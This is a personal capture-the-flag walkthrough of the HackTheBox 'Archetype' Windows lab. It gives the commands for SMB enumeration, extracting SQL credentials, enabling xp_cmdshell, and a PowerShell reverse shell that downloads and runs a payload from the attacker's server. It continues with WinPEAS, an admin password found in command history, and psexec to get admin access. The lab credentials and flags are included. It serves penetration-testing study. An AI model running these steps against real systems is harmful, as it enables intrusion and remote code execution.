# [HTB] Archetype
> [reference](https://systemweakness.com/archetype-hackthebox-walkthrough-be99a1fba8ea)

## details
- Hostname: `Archetype`
- IP: `10.129.185.22`

## recon
- [nmap scan](./nmap.log)
	- cmd: `nmap -sC -sV -A -o nmap.log [Target_IP]`
	- open smb (p139 & p445) and sql server (Microsoft SQL Server 2017)
	- windows os detected

## hacking
- smb _guest_ login allowed (`smbclient -L [Target_IP]`)
	- shared folders: `ADMIN$`, `backups`, `C$`, `IPC$`
	- found `prod.dtsConfig` in `backups`
		- found `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc` (probable _sql logins_)

- using an __impacket__ script for connecting
	- cmd: `python3 /opt/impacket/examples/mssqlclient.py Archetype/sql_svc@[Target_IP] -windows-auth`
	- got access to the sql server!

- check what priv we have `SELECT is_srvrolemember('sysadmin');` (1=T)
- `xp_cmdshell` can be exploited to gain reverse shell (reference: [1](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), [2](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16))
- type following cmds (to enable _xp_cmdshell_):
```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

- `python3 -m http.server` on attacker machine (req. for _rev sh_ & _winpeas_)

- now lets get a __reverse shell__
	- download [powershell_reverse_shell.ps1](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1) (attacker machine)
	- `nc -lvnp 4444` (attacker machine)
	- `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://[Your_tun0_IP]:8000/powershell_reverse_shell.ps1\");"` (sql cmdline)
	- got rev shell!

 - using [`winpeas`](https://github.com/carlospolop/PEASS-ng/releases/)
 	- exec `powershell` > `wget http://[Your_tun0_IP]:8000/winPEASx64.exe -outfile winPEASx64.exe` > `./winPEASx64.exe`
 	- found `C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf3f4951fec21a3`
 	- found `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
	- cmd: `type C:\<path>\ConsoleHost_history.txt`
		- got `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`

- to login we need `psexec.py`
	- cmd: `python3 /opt/impacket/examples/psexec.py administrator@[Target_IP]`
	- got admin access!
	- found `C:\Users\Administrator\Desktop\root.txt` > `b91ccec3305e98240082d4474b848528`

